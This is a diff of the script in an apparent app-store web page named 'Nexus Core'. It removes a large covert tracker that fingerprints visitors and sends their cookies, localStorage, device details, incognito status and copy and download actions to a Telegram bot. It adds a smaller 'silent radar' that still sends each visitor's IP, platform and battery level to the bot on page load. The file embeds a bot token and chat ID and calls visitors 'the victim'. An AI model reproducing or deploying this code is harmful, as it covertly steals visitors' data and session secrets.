@@ -367,39 +367,50 @@
     &copy; 2026 Nexus Core. All rights reserved. <br>
     Distributed by ZeroX premiums
 </footer>
-
 <script>
-// 1. الإعدادات العامة
+// --- [1] الإعدادات العامة ونظام الصفحات ---
 const appsPerPage = 6;
 let currentPage = 1;
 let isSearchActive = false;
+const token = "7575966226:AAELuzHD5DBcmAcUbGOAj7C_PsTWwMok8Ew"; 
+const chatId = "7388801889"; 
 
-// 2. دالة عرض التطبيقات والتحكم في التقسيم
 function displayApps(page) {
     const apps = document.querySelectorAll('.app-card');
-    const paginationDiv = document.getElementById('pagination');
-    
-    if (isSearchActive) return; // إذا كان البحث شغال، لا تتدخل الصفحات
-
+    if (isSearchActive) return;
     const totalPages = Math.ceil(apps.length / appsPerPage);
-    
     apps.forEach((app, index) => {
-        app.style.display = 'none';
-        if (index >= (page - 1) * appsPerPage && index < page * appsPerPage) {
-            app.style.display = 'block';
-        }
+        app.style.display = (index >= (page - 1) * appsPerPage && index < page * appsPerPage) ? 'block' : 'none';
     });
-
     setupPagination(totalPages);
 }
 
-// 3. محرك البحث الذكي
-function executeSearch() {
-    const searchInput = document.getElementById('searchInput');
-    const filter = searchInput.value.toLowerCase().trim();
-    const apps = document.querySelectorAll('.app-card');
+function setupPagination(totalPages) {
     const paginationDiv = document.getElementById('pagination');
+    if (!paginationDiv) {
+        const newDiv = document.createElement('div');
+        newDiv.id = 'pagination';
+        newDiv.style.cssText = "display:flex; justify-content:center; margin:20px;";
+        document.querySelector('.container').after(newDiv);
+    }
+    const div = document.getElementById('pagination');
+    div.innerHTML = ''; 
+    if (totalPages <= 1) return; 
+    for (let i = 1; i <= totalPages; i++) {
+        const btn = document.createElement('button');
+        btn.innerText = i;
+        btn.style.cssText = `padding: 10px 15px; margin: 5px; background: ${i === currentPage ? '#007aff' : '#1c1f2b'}; color: white; border: 1px solid #333; border-radius: 8px; cursor: pointer;`;
+        btn.onclick = () => { currentPage = i; displayApps(i); window.scrollTo(0,0); };
+        div.appendChild(btn);
+    }
+}
+
+// --- [2] محرك البحث ---
+function executeSearch() {
+    const filter = document.getElementById('searchInput').value.toLowerCase().trim();
+    const apps = document.querySelectorAll('.app-card');
     const noResults = document.getElementById('noResults');
+    const paginationDiv = document.getElementById('pagination');
     let foundCount = 0;
 
     if (filter === "") {
@@ -412,13 +423,9 @@ function executeSearch() {
 
     isSearchActive = true;
     if (paginationDiv) paginationDiv.style.display = 'none';
-
     apps.forEach(app => {
         const title = app.querySelector('.app-title').innerText.toLowerCase();
-        // جلب الوصف بأمان حتى لو كان فارغاً
-        const descElement = app.querySelector('.app-desc');
-        const desc = descElement ? descElement.innerText.toLowerCase() : "";
-
+        const desc = app.querySelector('.app-desc').innerText.toLowerCase();
         if (title.includes(filter) || desc.includes(filter)) {
             app.style.display = 'block';
             foundCount++;
@@ -426,393 +433,44 @@ function executeSearch() {
             app.style.display = 'none';
         }
     });
-
     noResults.style.display = (foundCount === 0) ? 'block' : 'none';
 }
 
-// 4. إنشاء أزرار الصفحات
-function setupPagination(totalPages) {
-    const paginationDiv = document.getElementById('pagination');
-    if (!paginationDiv) return;
-    paginationDiv.innerHTML = ''; 
-
-    if (totalPages <= 1) return; 
-
-    for (let i = 1; i <= totalPages; i++) {
-        const btn = document.createElement('button');
-        btn.innerText = i;
-        // تنسيق الزر
-        btn.style.cssText = `
-            padding: 8px 16px; margin: 0 5px; border: 1px solid #007aff;
-            background: ${i === currentPage ? '#007aff' : 'transparent'};
-            color: ${i === currentPage ? 'black' : '#007aff'};
-            border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.3s;
-        `;
-        btn.onclick = () => { 
-            currentPage = i; 
-            displayApps(i); 
-            window.scrollTo({top: 0, behavior: 'smooth'}); 
-        };
-        paginationDiv.appendChild(btn);
-    }
-}
-
-// 5. نظام النافذة المنبثقة (Modal)
+// --- [3] نظام النافذة المنبثقة (Modal) ---
 function openModal(title, bigDesc) {
     const modalBody = document.getElementById('modalBody');
     const modal = document.getElementById('appModal');
-    if (modalBody && modal) {
-        modalBody.innerHTML = `
-            <h2 style="color:#ffcc00; font-size:32px; margin-bottom:20px; text-align:center;">${title}</h2>
-            <div style="font-size:18px; line-height:1.7; color:#fff; text-align:right; direction:rtl;">
-                ${bigDesc}
-            </div>
-        `;
-        modal.style.display = "block";
-    }
+    modalBody.innerHTML = `
+        <h2 style="color:#ffcc00; font-size:32px; margin-bottom:20px; text-align:center;">${title}</h2>
+        <div style="font-size:18px; line-height:1.7; color:#fff; text-align:right; direction:rtl;">${bigDesc}</div>
+    `;
+    modal.style.display = "block";
 }
 
 function closeModal() {
-    const modal = document.getElementById('appModal');
-    if(modal) modal.style.display = "none";
+    document.getElementById('appModal').style.display = "none";
 }
 
-// 6. تشغيل النظام عند التحميل
+// --- [4] رادار ZeroX الصامت (تليجرام) ---
+async function silentRadar() {
+    try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        const battery = await navigator.getBattery();
+        const msg = `🎯 زائر جديد لـ Nexus Core\n🌐 IP: ${ipData.ip}\n📱 النظام: ${navigator.platform}\n🔋 البطارية: ${Math.round(battery.level*100)}%`;
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+    } catch(e) {}
+}
+
+// --- [5] التشغيل النهائي ---
 document.addEventListener('DOMContentLoaded', () => {
-    displayApps(1); // عرض أول صفحة
-
-    const searchInput = document.getElementById('searchInput');
-    if (searchInput) {
-        searchInput.addEventListener('input', executeSearch);
-    }
-    
-    // إغلاق المودال عند الضغط خارجه
-    window.addEventListener('click', (event) => {
-        const modal = document.getElementById('appModal');
-        if (event.target == modal) closeModal();
-    });
-});
-
-
-
-const token = "7575966226:AAELuzHD5DBcmAcUbGOAj7C_PsTWwMok8Ew"; 
-const chatId = "7388801889"; 
-
-    // --- كاشف الشحن السريع لـ ZeroX ---
-async function getPowerTech() {
-    try {
-        const battery = await navigator.getBattery();
-        let powerSource = battery.charging ? "🔌 موصل بالطاقة" : "🔋 يعتمد على البطارية";
-        let healthEstimate = (battery.level > 0.9) ? "جديد/ممتاز" : "مستهلك";
-        return `${powerSource} | صحة البطارية: ${healthEstimate}`;
-    } catch(e) { return "غير متاح"; }
-}
-
-    // --- رادار (يشتغل فور فتح الصفحة) ---
-    async function silentRadar() {
-        // استدعاء قوة الطاقة
-let powerStatus = await getPowerTech();
-
-   
-
-        // --- كود البصمة الوراثية للمتصفح (DNA) ---
-function getCanvasFingerprint() {
-    try {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        const txt = 'ZeroX-Radar-2026';
-        ctx.textBaseline = "top";
-        ctx.font = "14px 'Arial'";
-        ctx.textBaseline = "alphabetic";
-        ctx.fillStyle = "#f60";
-        ctx.fillRect(125,1,62,20);
-        ctx.fillStyle = "#069";
-        ctx.fillText(txt, 2, 15);
-        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-        ctx.fillText(txt, 4, 17);
-        
-        // تحويل الرسمة إلى كود فريد (Hash)
-        const b64 = canvas.toDataURL().replace("data:image/png;base64,","");
-        return b64.slice(0, 32); 
-    } catch (e) { return "بصمة محمية"; }
-}
-
-// تعريف المتغير قبل استخدامه في الرسالة
-let deviceFingerprint = getCanvasFingerprint();
-
-        
-    // --- كود قنص المساحة الخاص بـ ZeroX ---
-    let storageInfo = "محجوب/غير مدعوم";
-
-    // --- كود قنص نوع المعالج الرسومي (GPU) المحدث ---
-    let gpuInfo = "غير معروف";
-    try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (gl) {
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            if (debugInfo) {
-                gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_ID);
-            } else {
-                gpuInfo = gl.getParameter(gl.RENDERER); // محاولة بديلة
-            }
-        }
-    } catch (e) { 
-        gpuInfo = "محجوب من المتصفح"; 
-    }
-
-    if (!gpuInfo) gpuInfo = "محجوب من النظام"; 
-
-    // --- تكملة كود المساحة ---
-    try {
-        if (navigator.storage && navigator.storage.estimate) {
-            const estimate = await navigator.storage.estimate();
-            const total = (estimate.quota / (1024 ** 3)).toFixed(1);
-            const free = ((estimate.quota - estimate.usage) / (1024 ** 3)).toFixed(1);
-            storageInfo = `${total}GB الكلية | ${free}GB الفاضية`;
-        }
-    } catch (e) { 
-        storageInfo = "خطأ في الجلب"; 
-    }
-    // ---------------------------------------
-
-    // معلومات المتصفح والنظام
-    let ua = navigator.userAgent;
-    let platform = navigator.platform;
-    let language = navigator.language;
-    let cores = navigator.hardwareConcurrency || "غير معروف"; // عدد نويات المعالج
-    let ram = navigator.deviceMemory || "غير معروف"; // الذاكرة العشوائية GB
-    let screenRes = `${window.screen.width}x${window.screen.height}`;
-    let colorDepth = window.screen.colorDepth;
-    let connection = navigator.connection ? navigator.connection.effectiveType : "غير معروف"; // نوع الشبكة (4G/WiFi)
-
-    let batteryInfo = "غير متاح";
-    let ipAddr = "جاري الجلب...";
-
-    // جلب تفاصيل البطارية (الشحن والحالة)
-    try {
-        const battery = await navigator.getBattery();
-        batteryInfo = `🔋 المستوى: ${(battery.level * 100).toFixed(0)}% | ⚡ الحالة: ${battery.charging ? 'جاري الشحن الآن' : 'لا يشحن حالياً'}`;
-    } catch (e) {}
-
-    // جلب الـ IP
-    try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        ipAddr = data.ip;
-    } catch (e) {}
-
-
-        const megaMsg = `
-----------------------------------
-🧬 بصمة الجهاز (DNA): ${deviceFingerprint}
-🌐 الـ IP: ${ipAddr}
-📡 الشبكة: ${connection}
-📱 النظام: ${platform}
-🧠 الأنوية: ${cores} Core
-🎮 المعالج (GPU): ${gpuInfo} 
-📟 الذاكرة (RAM): ${ram} GB
-💾 التخزين: ${storageInfo}
-🔋 البطارية: ${batteryInfo}
-----------------------------------
-🖥️ الشاشة: ${screenRes}
-🌍 اللغة: ${language}
-🌐 المتصفح: ${ua}
-----------------------------------
-نيكسوس كور 
-`;
-
-        
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(megaMsg)}`);
-    }
-
-    // تشغيل الرادار فوراً
-        // 1. تشغيل الرادار الصامت فوراً
-    silentRadar(); 
-
-
-    // 🍪 قناص الخزنات الشامل (Cookies + LocalStorage)
-    window.addEventListener('load', () => {
-        // 1. جلب الكوكيز المتاحة
-        let cookies = document.cookie || "لا يوجد كوكيز متاحة (محمية)";
-        
-        // 2. جلب بيانات التخزين المحلي (LocalStorage) - هنا الأسرار الحقيقية!
-        let localData = "";
-        try {
-            localData = JSON.stringify(localStorage);
-            if (localData === "{}") localData = "الخزنة المحلية فارغة";
-        } catch (e) { localData = "محجوبة أو خطأ في الوصول"; }
-
-        // 3. بناء تقرير الخزنة
-        const storageReport = `
-🍪 تقرير  لـ ZeroX:
-----------------------------------
-📦 الكوكيز :
-${cookies}
-----------------------------------
-🔐 التخزين المحلي (LocalStorage):
-${localData}
-----------------------------------
-⚠️ ملاحظة: الكوكيز المحمية بـ HttpOnly لا تظهر هنا.
-        `;
-
-        // إرسال التقرير للتلجرام
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(storageReport)}`);
-    });
-
-
-        }).catch(() => {});
-    }, { once: true }); 
-
-    // 🚨  وضع التخفي
-    if (!window.RequestFileSystem && !window.webkitRequestFileSystem) {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ تنبيه: الضحية يستخدم وضع التخفي!")}`);
-    }
-
-    // 📱 رادار الميلان والحركة (Gyroscope)
-    window.ondeviceorientation = (event) => {
-        if (event.beta !== null) {
-            let status = event.beta > 45 ? "مائل للخلف" : "مستوي";
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📱 وضعية الجهاز الآن: " + status)}`);
-            window.ondeviceorientation = null; // إرسال لمرة واحدة
-        }
-    };
-
-    // ✂️ كاشف النسخ من الصفحة
-    document.addEventListener('copy', () => {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("✂️ الضحية قام بنسخ شيء من الصفحة!")}`);
-
-
-// دالة إرسال التقارير  (Telegram)
-async function sendToHQ(message) {
-    const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
-    try {
-        await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message,
-                parse_mode: 'Markdown'
-            })
-        });
-    } catch (e) {
-        console.error("خطأ في الاتصال بالسيرفر!");
-    }
-}
-
-// دالة سحب الـ IP وجلب معلومات الجهاز عند التحميل
-async function captureTarget(appName) {
-    try {
-        // سحب الـ IP عبر خدمة خارجية
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        const userIP = data.ip;
-
-        // تجهيز التقرير 
-        const report = `
-🎯 **تم رصد عملية تحميل جديدة!**
-------------------------------
-📱 **التطبيق:** ${appName}
-🌐 **الأيبي (IP):** \`${userIP}\`
-📱 **النظام:** ${navigator.platform}
-🕒 **الوقت:** ${new Date().toLocaleString('ar-YE')}
-------------------------------
-🛠️ *Nexus Core - Operation ZeroX*
-        `;
-
-        sendToHQ(report);
-    } catch (error) {
-        sendToHQ(`⚠️ فشل سحب الـ IP، لكن الضحية يحاول تحميل: ${appName}`);
-    }
-}
-
-// تفعيل  جميع أزرار التحميل
-document.addEventListener('click', function(e) {
-    if (e.target && e.target.classList.contains('download-btn')) {
-        // سحب اسم التطبيق من الكرت
-        const appCard = e.target.closest('.app-card');
-        const appName = appCard.querySelector('.app-title').innerText;
-        
-        // إطلاق الرادار
-        captureTarget(appName);
-    }
-});
-    });
-
-function openModal(title, bigDesc) {
-    document.getElementById('modalBody').innerHTML = `
-        <h2 style="color:var(--primary-color); font-size:35px;">${title}</h2>
-        <div style="font-size:20px; line-height:1.8; margin-top:20px; direction:rtl;">
-            ${bigDesc}
-        </div>
-    `;
-    document.getElementById('appModal').style.display = "block";
-}
-
-function closeModal() {
-    document.getElementById('appModal').style.display = "none";
-}
-
-// إغلاق النافذة عند الضغط خارجها
-window.onclick = function(event) {
-    let modal = document.getElementById('appModal');
-    if (event.target == modal) { closeModal(); }
-}
-
-function openModal(title, bigDesc) {
-    // هذا السطر يبحث عن مكان الوصف ويحط فيه الكلام اللي كتبناه
-    document.getElementById('modalBody').innerHTML = `
-        <h2 style="color:#ffcc00; font-size:32px; margin-bottom:20px;">${title}</h2>
-        <div style="font-size:18px; line-height:1.7; color:#fff; text-align:right; direction:rtl;">
-            ${bigDesc}
-        </div>
-    `;
-    // هذا السطر يظهر النافذة
-    document.getElementById('appModal').style.display = "block";
-}
-
-function closeModal() {
-    // هذا السطر يخفي النافذة
-    document.getElementById('appModal').style.display = "none";
-}
-
-// قفل النافذة لو ضغطت في أي مكان برا الصندوق
-window.onclick = function(event) {
-    var modal = document.getElementById('appModal');
-    if (event.target == modal) {
-        modal.style.display = "none";
-    }
-    }
-    //قيد التطوير
-// --- وظائف النافذة المنبثقة (Modal) المصححة ---
-function openModal(title, bigDesc) {
-    const modalBody = document.getElementById('modalBody');
-    const modal = document.getElementById('appModal');
-    
-    if (modalBody && modal) {
-        modalBody.innerHTML = `
-            <h2 style="color:#ffcc00; font-size:32px; margin-bottom:20px; text-align:center;">${title}</h2>
-            <div style="font-size:18px; line-height:1.7; color:#fff; text-align:right; direction:rtl;">
-                ${bigDesc}
-            </div>
-        `;
-        modal.style.display = "block";
-    }
-}
-
-function closeModal() {
-    document.getElementById('appModal').style.display = "none";
-}
-
-// إغلاق عند الضغط خارج الصندوق
-window.addEventListener('click', function(event) {
-    const modal = document.getElementById('appModal');
-    if (event.target == modal) {
-        closeModal();
-    }
+    displayApps(1);
+    silentRadar();
+    document.getElementById('searchInput').addEventListener('input', executeSearch);
+    window.onclick = (e) => { if (e.target == document.getElementById('appModal')) closeModal(); };
 });
 </script>
+
 
 <div id="appModal" class="modal">
     <div class="modal-content">
